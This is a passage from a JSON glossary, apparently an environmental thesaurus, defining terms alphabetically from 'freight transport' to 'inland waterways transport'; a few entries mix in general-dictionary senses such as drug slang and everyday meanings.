knowledge.\"], \"freight transport\": [\"Transportation of goods by ship, aircraft or other vehicles.\"], \"freon\": [\"Trade name for a group of polyhalogenated hydrocarbons containing fluorine and chlorine; an example is trichlorofluoromethane.\"], \"freshwater\": [\"Water having a relatively low mineral content, generally less than 500 mg/l of dissolved solids.\"], \"freshwater biology\": [\"The scientific study of the characteristic life processes of living organisms found in a natural body of water that does not contain significant amounts of dissolved salts and minerals, such as a lake or river.\"], \"freshwater ecosystem\": [\"The living organisms and nonliving materials of an inland aquatic environment.\"], \"freshwater organism\": [\"Organism which lives in freshwater.\\\\n\\\\n(Source: PHC)\"], \"frog\": [\"Any insectivorous anuran amphibian of the family Ranidae, such as Rana temporaria of Europe, having a short squat tailless body with a moist smooth skin and very long hind legs specialized for hopping.\"], \"frost\": [\"A deposit of interlocking ice crystals formed by direct sublimation on objects.\\\\n(Source: MGH)\"], \"fruit\": [\"A fully matured plant ovary with or without other floral or shoot parts united with it at maturity.\", \"A botanical fruit that can be eaten raw used as food.\"], \"fruit cultivation\": [\"Cultivation of fruit trees for home consumption or on a commercial basis.\"], \"fruit tree\": [\"Any tree that bears edible fruit.\\\\n(Source: CED)\"], \"fuel\": [\"Solid, liquid, or gaseous material such as gas, gasoline, oil, coal or wood, used to produce heat or power by burning.\"], \"fuel additive\": [\"Substance (such as tetraethyl lead) which is added to petrol to prevent knocking.\"], \"fuel alcohol\": [\"Alternative source of energy for motor vehicles. It is produced by fermentation of sugar cane by the yeast Saccharomyces cerevisiae.\\\\n(Source: DICCHE)\"], \"fuel consumption\": [\"The amount of fuel utilized.\\\\n(Source: PHCa)\"], \"fuel oil\": [\"A liquid product burned to generate heat, exclusive of oils with a flash point below 38\\u00b0C; includes heating oils, stove oils, furnace oils, bunker fuel oils.\\\\n(Source: MGH)\"], \"fuel wood\": [\"Wood used for heating.\"], \"fume\": [\"Solids in the air that have been generated by the condensation of vapors, chemical reactions or sublimation (a direct change from solid to gas). Often metallic oxides or metals, these particles are less than 1 micrometer in diameter and may be toxic.\\\\n(Source: ALL)\"], \"fumigation\": [\"The use of a chemical compound in a gaseous state to kill insects, nematodes, arachnids, rodents, weeds, and fungi in confined or inaccessible locations; also used to control weeds, nematodes, and insects in the field.\"], \"functional substance\": [\"A substance from the point of view of its function or purpose, for example a painting agent or a preserving substance.\"], \"mycete\": [\"Nucleated usually filamentous, sporebearing organisms devoid of chlorophyll.\"], \"fungus\": [\"Nucleated usually filamentous, sporebearing organism devoid of chlorophyll.\"], \"fungicide\": [\"A chemical used to kill or halt the development of fungi that cause plant disease.\"], \"fur\": [\"The hair-covered, dressed pelt of a mammal, used in the making of garments and as trimming or decoration.\"], \"fur animal\": [\"Animal bred and slaughtered for its fur.\"], \"furan\": [\"A colourless flammable toxic liquid heterocyclic compound, used in the synthesis of nylon.\\\\n(Source: CED)\"], \"furnace\": [\"A structure or apparatus in which heat is produced by the combustion of fuel, often to warm houses, melt metals, produce steam and bake pottery.\"], \"furniture\": [\"The movable articles in a room or an establishment that make it fit for living or working.\", \"A movable object (such as a table, chair, lamp) inside a dwelling, that is useful or decorative.\"], \"furriery\": [\"The business or trade of dressed furs and garments made from the coats of certain animals.\"], \"gamma radiation\": [\"A form of electromagnetic radiation or light emission of frequencies produced by sub-atomic particle interactions, such as electron-positron annihilation or radioactive decay.\"], \"garden\": [\"A piece of land next to a house where flowers and other plants are grown and which often has an area of grass.\", \"To grow plants in a garden; to create or maintain a garden.\"], \"garden waste\": [\"Natural organic matter discarded from gardens and yards including leaves, grass clippings, prunings, brush and stumps.\"], \"garrigue\": [\"Mediterranean bush consisting of low evergreen shrubs and abundant herbaceous plants.\"], \"gas\": [\"A substance that continues to occupy in a continuous manner the whole of the space in which it is placed, however large or small this place is made, the temperature remaining constant.\", \"A fuel for internal combustion engines consisting essentially of volatile flammable liquid hydrocarbons derived from crude petroleum.\", \"To show off.\"], \"gas chromatography\": [\"A separation technique involving passage of a gaseous moving phase through a column containing a fixed phase; it is used principally as a quantitative analytical technique for volatile compounds.\\\\n(Source: MGH)\"], \"gas company\": [\"Company charged with the production and distribution of gas for domestic use.\\\\n(Source: RRDA)\"], \"gas engine\": [\"An internal combustion engine that uses gaseous fuel.\"], \"gaseous state\": [\"State of matter in which the matter concerned occupies the whole of its container irrespective of its quantity.\\\\n(Source: DICCHE)\"], \"gasification\": [\"Any chemical or heat process used to convert a substance to a gas.\"], \"gas liquefaction\": [\"Conversion of a gas to the liquid phase by cooling or compression.\"], \"gas mixture\": [\"Mixture of two or more different gases.\"], \"gas network\": [\"Interconnected system of pipes for the distribution and supply of gas.\"], \"gasohol\": [\"A mixture of 80% or 90% petrol with 20% or 10% ethyl alcohol, for use as a fuel in internal combustion engines.\"], \"gasoline engine\": [\"An internal combustion engine that uses a mixture of air and gasoline vapour as a fuel.\"], \"gas pipeline\": [\"A long pipe, especially underground, used to transport gas over long distances.\"], \"gas powered plant\": [\"Power station which burns gas, as opposed to a coal-fired station or nuclear power station.\"], \"gas purification\": [\"Removal of pollutants or contaminants from waste incineration or other combustion processes.\\\\n(Source: MGHa)\"], \"gas reservoir\": [\"Large tank for storing coal gas or natural gas.\\\\n(Source: PHC)\"], \"gas supply\": [\"The provision and storage of any fuel gas, for the use of a municipality, or other fuel gas user.\"], \"gastropod\": [\"Any mollusc of the class Gastropoda, typically having a flattened muscular foot for locomotion and a head that bears stalked eyes.\"], \"gene bank\": [\"Storehouse of seeds or vegetative tissue, kept in low humidity and temperature, to help maintain genetic diversity.\"], \"general chemistry\": [\"The study of the elements and the compounds they form.\"], \"gene\": [\"A unit of heredity composed of DNA occupying a fixed position on a chromosome. A gene may determine a characteristic of an individual by specifying a polypeptide chain that forms a protein or part of a protein (structural gene); or repress such operation (repressor gene).\\\\n(Source: CED)\"], \"genetic diversity\": [\"The variation between individuals and between populations within a species.\"], \"genetic effect\": [\"Inheritable change, chiefly mutations produced by chemical substances, herbicides, radiations, etc.\"], \"genetic engineering\": [\"1) The complex of techniques for the production of new genes and the alteration of the structure of the chromosomes to produce effects beneficial to man, in agriculture and medicine.\\\\n2) The intentional production of new genes and alteration of genomes by the substitution or addition of new genetic material.\\\\n(Source: ZINZAN /  MGH)\"], \"genetic information\": [\"The information for protein synthesis contained in the nucleotide sequences of the DNA polynucleotide chain.\\\\n(Source: RRDA)\"], \"genetic modification\": [\"Inheritable changes produced by ionizing radiation, exposure to certain chemicals, ingestion of some medication and from other causes.\\\\n(Source: CONFER)\"], \"genetic resource\": [\"The gene pool in natural and cultivated stocks of organisms that are available for human exploitation. It is desirable to maintain as diverse a range of organisms as possible, particularly of domesticated cultivars and their ancestors, in order to maintain a wide genetic base. The wider the genetic base, the greater the capacity for adaptation to particular environmental conditions.\\\\n(Source: ALL2)\"], \"genetics\": [\"The science that is concerned with the study of biological inheritance.\"], \"genetic variation\": [\"Change in one or more phenotypic characteristics, due to gene mutation or rearrangement, environmental effects, etc.\"], \"geodesy\": [\"A subdivision of geophysics which includes determination of the size and shape of the earth, the earth's gravitational field, and the location of points fixed to the earth's crust in an earth-referred coordinate system.\"], \"geogenic factor\": [\"Factors which originate in the soil, as opposed to those of anthropic origin (anthropogenic).\\\\n(Source: RRDA)\"], \"geographic information system\": [\"An organized collection of computer hardware, software, geographic data, and personnel designed to efficiently capture, store, update, manipulate, analyze, and display all forms of geographically referenced information that can be drawn from different sources, both statistical and mapped.\"], \"geography\": [\"The study of the natural features of the earth's surface, comprising topography, climate, soil, vegetation, etc. and man's response to them.\"], \"geology\": [\"The study or science of the earth, its history, and its life as recorded in the rocks.\"], \"geomorphology\": [\"The study of the classification, description, nature, origin, and development of present landforms and their relationships to underlying structures, and of the history of geologic changes as recorded by these surface features.\"], \"geophysics\": [\"The physics of the earth and its environment, that is, earth, air and space.\"], \"geotechnology\": [\"The application of scientific methods and engineering techniques to the exploitation and use of natural resources.\"], \"geothermal energy\": [\"An energy produced by tapping the earth's internal heat. At present, the only available technologies to do this are those that extract heat from hydrothermal convection systems, where water or steam transfer the heat from the deeper part of the earth to the areas where the energy can be tapped. The amount of pollutants found in geothermal vary from area to area but may contain arsenic, boron, selenium, lead, cadmium, and fluorides. They also may contain hydrogen sulphide, mercury, ammonia, radon, carbon dioxide, and methane.\\\\n(Source: KOREN)\"], \"germ\": [\"A pathogenic micro-organism.\", \"Living substance capable of developing into an organ, part, or organism as a whole; a primordium.\"], \"germination\": [\"The beginning or the process of development of a spore or seed.\"], \"germ plasm\": [\"The hereditary material transmitted to the offspring via the gametes.\"], \"glacier\": [\"Slow moving masses of ice which have accumulated either on mountains or in polar regions.\"], \"glaciology\": [\"The study of all aspects of snow and ice, and in particular of existing glaciers, ice sheets, and their physical properties.\"], \"glass\": [\"A hard, amorphous, inorganic, usually transparent, brittle substance made by fusing silicates, sometimes borates and phosphates, with certain basic oxides and then rapidly cooling to prevent crystallization.\", \"A surface that reflects light.\", \"A vessel (especially one made of glass) from which drinks may be drunk.\", \"A smooth surface, usually made of glass with reflective material painted on the underside, that reflects light so as to give an image of what is in front of it.\", \"An addictive psychoactive drug of formula C\\u2081\\u2080H\\u2081\\u2085N.\"], \"glass industry\": [\"Industry for the production of glassware.\\\\n(Source: CED)\"], \"global warming\": [\"Changes in the surface-air temperature, referred to as the global temperature, brought about by the greenhouse effect which is induced by emission of greenhouse gases into the air.\"], \"glossary\": [\"An alphabetical list of terms concerned with a particular subject, field or area of usage that includes accompanying definitions.\"], \"glue\": [\"Substance used for sticking objects together.\"], \"golf\": [\"A game played on a large open course, the object of which is to hit a ball using clubs, with as few strokes as possible, into each of usually 18 holes.\", \"To play golf.\"], \"grain\": [\"Edible, starchy seeds of the grass family (Graminae) usable as food by man and his livestock.\"], \"grass\": [\"A very large and widespread family of Monocotyledoneae, with more than 10.000 species, most of which are herbaceous, but a few are woody. The stems are jointed, the long, narrow leaves originating at the nodes. The flowers are inconspicuous, with a much reduced perianth, and are wind-pollinated or cleistogamous.\", \"A drug prepared from the cannabis plant, that is smoked or ingested for its euphoric effect.\"], \"grass fire\": [\"A conflagration in or destroying large areas of any vegetation in the Gramineae family as found in fields, meadows, savannas or other grasslands.\"], \"grasshopper\": [\"A plant-eating insect with long back legs that can jump very high and makes a sharp high noise using its back legs or wings.\"], \"grassland\": [\"An area where the vegetation is dominated by grasses and other herbaceous plants.\"], \"grassland ecosystem\": [\"The interacting system of the biological communities located in biomes characterized by the dominance of indigenous grasses, grasslike plants and forbs, and their non-living environmental surroundings.\\\\n(Source: TOE / DOE)\"], \"gravel\": [\"To have an unwanted negative influence on someone, to be distractive to or for someone, impress someone or something in a troublesome or uneasy way.\", \"A mixture of rock fragments and pebbles that is coarser than sand.\\\\n(Source: CED)\", \"To make someone rather angry or impatient; to cause annoyance.\"], \"gravel pit\": [\"A place where gravel is dug out of the ground.\"], \"grazing\": [\"The vegetation on pastures that is available for livestock to feed upon.\"], \"greenbelt\": [\"An area of land around an urban area that is protected from large-scale housing.\"], \"green corridor\": [\"Avenues along which wide-ranging animals can travel, plants can propagate, genetic interchange can occur, populations can move in response to environmental changes and natural disasters, and threatened species can be replenished from other areas.\"], \"environmental tax\": [\"An amount of money demanded by a government to finance clean-up, prevention, reduction, enforcement or educational efforts intended to promote ecological integrity and the conservation of natural resources.\"], \"greenhouse cultivation\": [\"Cultivation of plants, especially of out-of-season plants, in glass-enclosed, climate-controlled structures.\\\\n(Source: MGH)\"], \"greenhouse effect\": [\"The warming of the Earth's atmosphere caused by the increasing concentration of atmospheric gases, such as water vapour and carbon dioxide. These gases absorb radiation emitted by the Earth, thus slowing down the loss of radiant energy from the Earth back to space.\"], \"greenhouse gas\": [\"A component of the atmosphere that influences the greenhouse effect, namely carbon dioxide, methane, nitrous oxides, ozone, CFCs and water vapour.\"], \"green manure\": [\"Herbaceous plant material plowed into the soil while still green.\"], \"green revolution\": [\"The development of high-yield strains of wheat, corn and rice during the 1960s and early 1970s to increase the food supplies and solve the world's hunger problems.\"], \"green space\": [\"A plot of vegetated land separating or surrounding areas of intensive residential or industrial use and devoted to recreation or park uses.\"], \"green vegetable\": [\"A vegetable having the edible parts rich in chlorophyll and forming an important source of vitamins and micronutrients.\"], \"grinding\": [\"The process of reducing an object to powder or small fragments.\"], \"gross national product\": [\"Value of all goods and services produced in a country in one year, plus income earned by its citizens abroad, minus income earned by foreigners in the country.\"], \"groundwater\": [\"Water that occupies pores and crevices in rock and soil, below the surface and above a layer of impermeable material.\"], \"groundwater extraction\": [\"The process, deliberate or inadvertent, of extracting ground water from a source at a rate so in excess of the replenishment that the ground water level declines persistently, threatening exhaustion of the supply or at least a decline of pumping levels to uneconomic depths.\"], \"gulf\": [\"An inlet of the sea of large areal proportions, more indented than a bay and generally more enclosed.\"], \"gymnosperm\": [\"Any seed-bearing plant of the division Gymnospermae, in which the ovules are borne naked on the surface of the mega sporophylls, which are often arranged in cones.\"], \"gypsum\": [\"A colourless or white mineral used in the building industry and in the manufacture of cement, rubber, paper and plaster of Paris.\"], \"habitat\": [\"The locality in which a plant or animal naturally grows or lives. It can be either the geographical area over which it extends, or the particular station in which a specimen is found.\\\\n2) A physical portion of the environment that is inhabited by an organism or population of organisms. A habitat is characterized by a relative uniformity of the physical environment and fairly close interaction of all the biological species involved. In terms of region, a habitat may comprise a desert, a tropical forest, a prairie field, the Arctic Tundra or the Arctic Ocean.\\\\n(Source: WRIGHT /  GILP)\"], \"hail\": [\"Precipitation in the form of balls or irregular lumps of ice.\", \"To fall from the clouds in form of ball or lumps of ice.\"], \"half-life\": [\"The time required for one-half the atoms of a given amount of radioactive material to undergo radioactive decay.\"], \"haloform\": [\"A haloalkane, containing three halogen atoms, e.g. iodoform, CHI3; a haloform reaction is a reaction to produce haloforms from a ketone. For example, if propanone is treated with bleaching powder, the chlorinated ketone so formed reacts to form chloroform.\\\\n(Source: UVAROV)\"], \"halogenated biphenyl\": [\"Halogen derivatives of biphenyl.\"], \"halogenated hydrocarbon\": [\"One of a group of halogen derivatives of organic hydrogen and carbon containing compounds; the group includes monohalogen compounds (alkyl or aryl halides) and polyhalogen compounds that contain the same or different halogen atoms.\"], \"halogenated phenol\": [\"Halogen derivatives of phenol.\"], \"harbour\": [\"To maintain (a theory, thoughts, or feelings).\", \"To secretly shelter (as of fugitives or criminals).\", \"To keep in one's possession; of animals.\"], \"hardness\": [\"Resistance of a solid to indentation, scratching, abrasion or cutting.\\\\n(Source: MGH)\"], \"harvest\": [\"The amount or measure of the crop gathered in a season.\", \"To gather the ripened crop.\", \"The process of gathering the ripened crop.\"], \"hazard\": [\"A physical or chemical agent capable of causing harm to persons, property, animals, plants or other natural resources.\"], \"haze\": [\"Reduced visibility in the air as a result of condensed water vapour, dust, etc., in the atmosphere.\\\\n(Source: CED)\", \"Meteorologic phenomenon consisting of a big number of dry and extremely small particles (dust, sand, smoke) in suspension and carried by the air, so that visibility is considerably reduced (aprox. between 1 and 5 kms). It occurs when the relative humidity is below 70-80%. It has an opalescent color.\"], \"health\": [\"A state of dynamic equilibrium between an organism and its environment in which all functions of mind and body are normal.\"], \"health care\": [\"The prevention, treatment, and management of illness and the preservation of mental and physical well being through the services offered by the medical, nursing, and allied health professions.\", \"Treatment done for a patient in order to alleviate his pain and to heal him.\"], \"health facility\": [\"A facility or location where medical, dental, surgical, or nursing attention or treatment is provided to humans or animals.\"], \"health regulation\": [\"A body of rules or orders prescribed by government or management to promote or protect the soundness of human bodies and minds in the workplace, at home or in the general environment.\\\\n(Source: BLD / RHW)\"], \"hearing impairment\": [\"A decrease in strength or any abnormality or partial or complete loss of hearing or of the function of ear, or hearing system, due directly \\\\nor secondarily to pathology or injury; it may be either temporary or permanent.\"], \"hearing protection\": [\"The total of measures and devices implemented to preserve persons from harm to the faculty of perceiving sound.\"], \"heater\": [\"An apparatus that heats or provides heat.\"], \"heathland\": [\"An area with poor acid soil, typically dominated by ling (Calluna) or heaths (Erica).\"], \"heating\": [\"A system for supplying heat to a building.\"], \"heat pump\": [\"A device which transfers heat from a cooler reservoir to a hotter one, expending mechanical energy in the process.\"], \"heat supply\": [\"The provision of heating fuel, coal or other heating source materials, or the amount of heating capacity, for the use of a municipality, or other heat user.\\\\n(Source: ISEP)\"], \"heavy metal\": [\"A metal whose specific gravity is approximately 5.0 kg/l or higher.\"], \"hedge\": [\"A line of closely planted bushes or shrubs, marking the boundaries of a property.\"], \"herbicide\": [\"A chemical that controls or destroys undesirable plants.\"], \"herbivore\": [\"An animal that feeds on plants.\"], \"heterocyclic compound\": [\"Compound in which the ring structure is a combination of more than one kind of atom.\"], \"higher education\": [\"Study beyond secondary school at an institution that offers programs terminating in undergraduate and graduate degrees.\\\\n(Source: COE)\"], \"high mountain\": [\"The mountain part that exceeds the 1500 meters of altitude.\"], \"high-speed railway\": [\"Railway track designed so that trains can travel at speeds in excess of 200 km/h.\"], \"high-speed train\": [\"Train travelling at maximum speeds of 320 km/h on special high-speed rail lines.\"], \"high voltage line\": [\"An electric line with a voltage on the order of thousands of volts.\"], \"highway\": [\"A public road especially an important road that joins cities or towns together.\", \"A wide road built for fast moving traffic travelling long distances, with a limited number of points at which drivers can enter and leave it.\"], \"hill\": [\"A natural elevation of the land surface, usually rounded.\"], \"historical research\": [\"The study of events in relation to their development over time.\\\\n(Source: GOOD)\"], \"historical site\": [\"Place where significant historical events occurred and which is important to an indigenous culture or a community.\\\\n(Source: LANDYa)\"], \"history\": [\"A systematic written account comprising a chronological record of events (as affecting a city, state, nation, institution, science, or art) and usually including a philosophical explanation of the cause and origin of such events.\", \"The scientific study of events from a time-related perspective and the passing on of the knowledge obtained by this study for the purpose of education.\", \"the past events concerned in the development of a particular place, object, subject etc.\"], \"holiday\": [\"A day on which work is suspended by law or custom, such as a religious festival, bank holiday, etc.\"], \"horse\": [\"A large animal with four legs of the Equus caballus species which people ride on or use for carrying things or pulling vehicles.\"], \"horticulture\": [\"The art and science of growing plants.\"], \"hospital\": [\"A place where people who are ill or injured are treated and taken care of by doctors and nurses.\"], \"hospital waste\": [\"Solid waste, both biological and non-biological, produced by hospitals and discarded and not intended for further use.\"], \"hotel industry\": [\"The industry related with the provision of lodging and usually meals and other services for travelers and other paying guests.\"], \"hot water\": [\"Water that has been heated.\"], \"household\": [\"A group of persons sharing a home or living space, who aggregate and share their incomes, as evidenced by the fact that they regularly take meals together.\", \"Found in or having its origin in a home.\"], \"housing\": [\"Dwelling-houses collectively.\"], \"housing density\": [\"The number of dwelling units or the residential population of a given geographic area.\"], \"housing improvement\": [\"An addition, renovation or repair to a place of residence that increases its aesthetic, functional or financial value.\"], \"housing quality standard\": [\"A norm or measure applicable in legal cases and considered to reflect a relatively high grade or level of excellence in the construction, maintenance, operation, occupancy, use or appearance of dwelling units.\\\\n(Source: BLD)\"], \"human biology\": [\"The study of human life and character.\"], \"human ecology\": [\"The study of the growth, distribution, and organization of human communities relative to their interrelationships with other humans and other species and with their environment.\"], \"human health\": [\"The avoidance of disease and injury and the promotion of normalcy through efficient use of the environment, a properly functioning society, and an inner sense of well-being.\\\\n(Source: KOREN)\"], \"human-made disaster\": [\"Violent, sudden and destructive change in the environment caused by man.\"], \"human pathology\": [\"Branch of medicine concerned with the cause, origin, and nature of disease, including the changes occurring as a result of disease.\\\\n(Source: CED)\"], \"human physiology\": [\"A branch of biological sciences that studies the functions of organs and tissues in human beings.\\\\n(Source: OMD / WOR)\"], \"human settlement\": [\"Cities, towns, villages, and other concentrations of human populations which inhabit a given segment or area of the environment.\"], \"humus\": [\"The more or less decomposed organic matter in the soil.\", \"Earth formed by the decay of vegetable matter.\", \"A popular dish in the Middle East that consists of cooked, mashed chickpeas, blended with tahini, olive oil, lemon juice, salt and garlic.\"], \"hunting\": [\"The pursuit and killing or capture of wild animals.\"], \"hurricane\": [\"A tropical cyclone of great intensity; any wind reaching a speed of more than 73 miles per hour (117 kilometers per hour) is said to have hurricane force.\"], \"hydraulic engineering\": [\"A branch of civil engineering concerned with the design, erection, and construction of sewage disposal plants, waterworks, dams, water-operated power plants and such.\"], \"hydraulics\": [\"The branch of science and technology concerned with the mechanics of fluids, especially liquids.\"], \"hydrobiology\": [\"Study of organisms living in water.\\\\n(Source: ZINZAN)\"], \"hydrocarbon\": [\"A very large group of chemical compounds composed only of carbon and hydrogen.\\\\n(Source: MGH)\"], \"hydrochloric acid\": [\"A solution of hydrogen chloride gas in water.\"], \"hydroculture\": [\"Cultivation of plants without soil but in sand or vermiculite or other granular material, using a liquid solution of nutrients to feed them.\"], \"hydroelectric power plant\": [\"Power station which operates with the free renewable source of energy provided by falling water.\"], \"hydrogen\": [\"A flammable colourless gas that is the lightest and most abundant element in the universe. It occurs mainly in water and in most organic compounds and is used in the production of ammonia and other chemicals, in the hydrogenation of fats and oils, and in welding.\"], \"hydrogeology\": [\"The science dealing with the occurrence of surface and ground water, its utilization, and its functions in modifying the earth, primarily by erosion and deposition.\"], \"hydrography\": [\"Science which deals with the measurement and description of the physical features of the oceans, lakes, rivers, and their adjoining coastal areas, with particular reference to their control and utilization.\"], \"hydrologic balance\": [\"An accounting of the inflow to, outflow from, and storage in a hydrologic unit such as a drainage basin, aquifer, soil zone, lake or reservoir; the relationship between evaporation, precipitation, runoff, and the change in water storage.\"], \"hydrologic cycle\": [\"The movement of water between the oceans, ground surface and atmosphere by evaporation, precipitation and the activity of living organisms.\"], \"hydrology\": [\"The science that treats the occurrence, circulation, distribution, and properties of the waters of the earth, and their reaction with the environment.\", \"The science that treats the occurrence, circulation, distribution, and properties of the waters of the earth, and their reaction with the environment.\\\\n(Source: MGH)\"], \"hydrolysis\": [\"Decomposition or alteration of a chemical substance by water; in aqueous solutions of electrolytes, the reactions of cations with water to produce a weak base or of anions to produce a weak acid.\\\\n(Source: MGH)\"], \"hydrometeorology\": [\"That part of meteorology of direct concern to hydrologic problems, particularly to flood control, hydroelectric power, irrigation, and similar fields of engineering and water resource.\\\\n(Source: ZINZAN)\"], \"water power\": [\"Energy obtained from natural or artificial waterfalls, either directly by turning a water wheel or turbine, or indirectly by generating electricity in a dynamo driven by a turbine.\"], \"hydrosphere\": [\"All the waters of the Earth, as distinguished from the rocks, living things , and the air.\"], \"hygiene\": [\"A set of practices associated with the preservation of health, the prevention and fighting of diseases and healthy living.\", \"The study and use of practical measures for the preservation of public health.\"], \"hymenopteran\": [\"Insects including bees, wasps, ants, and sawflies, having two pair of membranous wings and an ovipositor specialized for stinging, sawing or piercing.\\\\n(Source: CED)\"], \"ice\": [\"The dense substance formed by the freezing of water to the solid state; it commonly occurs in the form of hexagonal crystals.\", \"To cool with ice.\", \"An addictive psychoactive drug of formula C\\u2081\\u2080H\\u2081\\u2085N.\"], \"iceberg\": [\"A large mass of detached land ice floating in the sea or stranded in shallow water.\"], \"ideology\": [\"A body of ideas that reflects the beliefs and interest of a nation, political system, etc. and underlies political action.\\\\n(Source: CED)\"], \"image processing\": [\"The process of converting 'raw' remotely sensed data into a usable form through the application of various transformations such as supervised and unsupervised classification schemes.\\\\n(Source: FORUMT)\"], \"immission\": [\"The reception of material, such as pollutants, by the environment and from any source.\"], \"immission control\": [\"Legislative and administrative procedures aimed at reducing the damage caused by emissions. Pollution control programmes are normally based on human-oriented acceptable dose limits. A very important measure concerns the organisation of an emission inventory.\\\\n(Source: GOODa)\"], \"immission control law\": [\"A law that protects the residents' health and resources of a region by limiting air pollution.\"], \"immission damage\": [\"Damage caused by pollution from a distinct source of emission.\"], \"immission forecast\": [\"The prediction of immissions is calculated on the basis of the pollutant load, the source height, the wind speed and the dispersion coefficient.\"], \"immune system\": [\"A body system that helps an organism to resist disease, through the activities of specialised blood cells or antibodies produced by them in response to natural exposure or inoculation.\\\\n(Source: KOREN /  CED)\"], \"immunity\": [\"The ability of an organism to resist disease or toxins by natural or artificial means.\"], \"immunoassay\": [\"Any of several methods for the quantitative determination of chemical substances such as hormones, drugs, and certain proteins that utilize the highly specific binding between an antigen and an antibody.\"], \"immunological disease\": [\"The disruption of the complex system of interacting cells, cell products and cell-forming tissues that protect the body from pathogens, destroys infected and malignant cells and removes cellular debris.\\\\n(Source: SMD / RHW)\"], \"immunology\": [\"A branch of biology concerned with the native or acquired resistance of higher animal forms and humans to infections.\"], \"impactor\": [\"Instrument which samples atmospheric suspensoids by impaction; such instruments consist of a housing which constrains the air flow past a sensitized sampling plate.\"], \"import\": [\"The act of bringing goods and merchandise into a country from a foreign country.\", \"To bring (something) in from a foreign country, especially for sale or trade.\", \"An object brought from a foreign country, especially for sale or trade.\"], \"impoverishment\": [\"The state of having little or no money and few or no material possessions\"], \"impulsive noise\": [\"Noise characterized by transient short-duration disturbances distributed essentially uniformly over the useful passband of a transmission system.\"], \"incineration\": [\"The burning of a dead body.\"], \"incineration of waste\": [\"The controlled burning of solid, liquid, or gaseous combustible wastes to produce gases and solid residues containing little or no combustible material in order to reduce the bulk of the original waste materials.\"], \"incinerator\": [\"Device which burns waste.\"], \"slope\": [\"The inclined surface of any part of the Earth's surface, as a hillslope; also, a broad part of a continent descending toward an ocean, as the Pacific slope.\\\\n(Source: BJGEO)\", \"To be at an angle; to move downwards.\"], \"income\": [\"The gain derived from capital, from labour or effort, or both combined, including profit or gain through sale or conversion of capital.\", \"Compensation for the selling of goods and services.\", \"Payment received for goods or services or coming from other sources as for instance, investments.\", \"Money that a person or an institution obtains.\"], \"incorporation\": [\"The act of incorporating a substance to another substance.\"], \"indemnity\": [\"Financial compensation, reimbursement or security for damages or loss offered by a government, insurance policy or contractual agreement under specified conditions and for specific casualties.\"], \"Indian Ocean\": [\"A body of water between the continents of Africa, Antarctica, Asia and Australia including the Bay of Bengal in the east and the Arabian Sea (with the Red Sea, the Gulf of Aden and the Persian Gulf) in the west, and containing several islands and island chains, such as the Andaman, Nicobar and Seychelles.\"], \"indicator\": [\"A blinking light mounted near the left and right front and rear corners of a vehicle, and sometimes on the sides, used to indicate the intention of a lateral change of position (turn or lane change).\"], \"indigenous forest\": [\"Forests which are native to a given area.\"], \"indoor environment\": [\"Environment situated in the inside of a house or other building.\"], \"industrial area\": [\"Areas allocated for industry within a town-planning scheme or environmental plan. The range of industries accommodated in a plan may include: light industry, service industry, general industry, hazardous, noxious or offensive industry, waterfront industry, extractive industry. Standards are usually defined for industrial areas relating to access and roads, drainage, car parking, aesthetics, landscaping, buffer zones, noise levels, and air and water pollution.\\\\n(Source: GILP96)\"], \"industrial medicine\": [\"The branch of medicine which deals with the relationship of humans to their occupations, for the purpose of the prevention of disease and injury and the promotion of optimal health, productivity, and social adjustment.\"], \"industrial process\": [\"Procedures involving chemical or mechanical steps to aid in the manufacture of items, usually carried out on a very large scale.\"], \"industrial site\": [\"The location for the individual manufacturing firm.\"], \"industrial sludge\": [\"Sludge produced as a result of industrial production processes or manufacturing.\"], \"industrial society\": [\"A large-scale community with diverse manufacturing sectors and an infrastructure and economy based on the science, technology and instrumental rationality of the modern West.\"], \"industrial waste\": [\"Waste materials discarded from industrial operations, or derived from manufacturing processes; may be solid, sludge (wet solids) or liquid wastes and may or may not be considered hazardous.\\\\n(Source: HMD /  ISEP)\"], \"industry\": [\"A group of establishments engaged in the same or similar kinds of economic activities. They produce a range of commodities that are sold with the expectation of recovering the total cost of production.\"], \"inert waste\": [\"Wastes that do not undergo any significant physical, chemical, or biological transformations when deposited in a landfill.\"], \"infant mortality\": [\"The rate of deaths occurring in the first year of life for a given population.\"], \"infection\": [\"The entry and development or multiplication of an infectious agent in the body of a living organism.\", \"Process in which a disease is transmitted.\"], \"infectious disease\": [\"Pathogenic condition resulting from invasion of an host by a pathogen that propagates causing infection.\", \"A disease caused by a microorganism or other agent, such as a bacterium, fungus, or virus, that enters the body of an organism.\"], \"infestation of crops\": [\"Invasion of crop by parasites.\"], \"infiltration\": [\"Movement of water through the soil surface into the ground.\"], \"inflammable substance\": [\"Substance liable to catch fire.\"], \"informatics\": [\"Science and technique of data elaboration and of automatic treatment of information.\"], \"information\": [\"All facts, ideas or imaginative works of the mind which have been communicated, published or distributed formally or informally in any format, or the knowledge that is communicated or received.\"], \"information service\": [\"An organized system of providing assistance or aid to individuals who are seeking information, such as by using databases and other information sources to communicate or supply knowledge or factual data.\\\\n(Source: RHW / OMD)\"], \"information system\": [\"Any coordinated assemblage of persons, devices and institutions used for communicating or exchanging knowledge or data, such as by simple verbal communication, or by completely computerized methods of storing, searching and retrieving information.\\\\n(Source: MHD)\"], \"information technology\": [\"The systems, equipment, components and software required to ensure the retrieval, processing and storage of information in all centres of human activity (home, office, factory, etc.), the application of which generally requires the use of electronics or similar technology.\"], \"infraction\": [\"A breach, violation, or infringement; as of a law, a contract, a right or duty.\", \"A crime less serious than a felony.\"], \"infrared radiation\": [\"Electromagnetic radiation whose wavelengths lie in the range from 0.75 or 0.8 micrometer to 1000 micrometers.\"], \"infrasound\": [\"Vibrations of the air at frequencies too low to be perceived as sound by the human ear, below about 15 hertz.\"], \"infrastructure\": [\"The basic network or foundation of capital facilities or community investments which are necessary to support economic and community activities.\"], \"inhabitant\": [\"A person occupying a region, town, house, country, etc.\", \"A human, officially being inhabitant of certain area inside well defined, and precise, borders - usually seen from a standpoint of census, government, register, etc.\"], \"injury\": [\"A stress upon an organism that disrupts the structure or function and results in a pathological process.\"], \"ink\": [\"A dispersion of a pigment or a solution of a dye in a carrier vehicle, yielding a fluid, paste, or powder to be applied to and dried on a substrate; writing, marking, drawing, and printing inks are applied by several methods to paper, metal, plastic, wood, glass, fabric, or other substrate.\"], \"inland fishery\": [\"Fishing in lakes, streams, etc.\"], \"inland navigation\": [\"The navigation of inland waterways, i.e. navigable rivers, canals, sounds, lakes, inlets, etc.\"], \"inland water\": [\"A lake, river, or other body of water wholly within the boundaries of a state.\\\\n(Source: MGH)\"], \"inland waterways transport\": [\"Transportation of persons and goods by boats travelling on 